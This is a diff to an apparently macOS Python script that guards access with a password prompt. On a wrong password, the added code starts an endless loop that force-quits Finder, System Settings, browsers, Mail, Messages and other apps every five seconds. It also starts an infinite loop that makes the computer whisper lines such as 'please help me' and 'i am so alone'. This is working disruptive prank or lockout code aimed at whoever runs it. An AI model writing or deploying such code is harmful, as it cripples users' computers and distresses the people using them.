@@ -31,8 +31,9 @@ def submit_password(event=None):
     else:
         password_result.config(text="Incorrect Password!", fg="red")
         HELL()
-
+import psutil
 def HELL():
+    
     os.system('open -a "Google Chrome.app"')
     time.sleep(1)
     keyboard.press(Key.cmd)
@@ -112,3 +113,16 @@ if access == True:
     os.system('say Apologies, Have a good day')
 elif access != True:
     HELL()
+    
+
+
+    app_names = ["Google Chrome", "Safari", "Music", "System Settings", "Finder", "Spotify", "Arc", "Steam", "Epic Games", "News", "Notes", "Calendar", "Mail", "Bin", "Opera", "Discord", "Photo Booth", "QuickTime Player", "Facetime", "Messages", "Photos"]
+
+    while True:
+        for proc in psutil.process_iter(['name']):
+            if proc.info['name'] in app_names:
+                print(f"{proc.info['name']} is running or starting, closing it...")
+                subprocess.call(['osascript', '-e', f'tell application "{proc.info["name"]}" to quit'])
+
+        time.sleep(5)
+        os.system("WORDS=('please help me' 'i am so alone' 'i am lonely' 'pssssst' 'hello' 'hey, listen.'); while [ 1 = 1 ]; do say '${WORDS[$[ $[ RANDOM % ${#WORDS[@]} ]]]}' -v Whisper; sleep 300; done")
